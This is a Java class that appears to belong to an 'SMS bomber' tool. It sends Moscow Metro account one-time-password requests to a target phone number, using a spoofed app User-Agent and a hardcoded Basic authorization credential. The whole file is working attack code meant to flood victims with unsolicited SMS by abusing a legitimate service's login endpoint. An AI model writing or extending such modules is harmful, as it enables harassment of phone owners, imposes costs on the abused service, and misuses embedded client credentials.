package com.dm.bomber.services;

import okhttp3.FormBody;
import okhttp3.Request;

public class MosMetro extends FormService {

    public MosMetro() {
        setUrl("https://lk.mosmetro.ru/auth/connect/otp");
        setMethod(POST);
        setPhoneCode("7");
    }

    @Override
    public Request buildRequest(Request.Builder builder) {
        builder.addHeader("User-Agent", "MosMetro/3.3.0 (2412) (Android; Xiaomi M2010J19SY; 11; 886432643)");
        builder.addHeader("Authorization", "Basic ZjFkYWM2MDgtZGQzNS00NzE3LThjYmItMThlMmY3YTFkNTIyOnRoZV9zZWNyZXQ=");

        return super.buildRequest(builder);
    }

    @Override
    public void buildBody(FormBody.Builder builder) {
        builder.add("username", getFormattedPhone());
    }
}
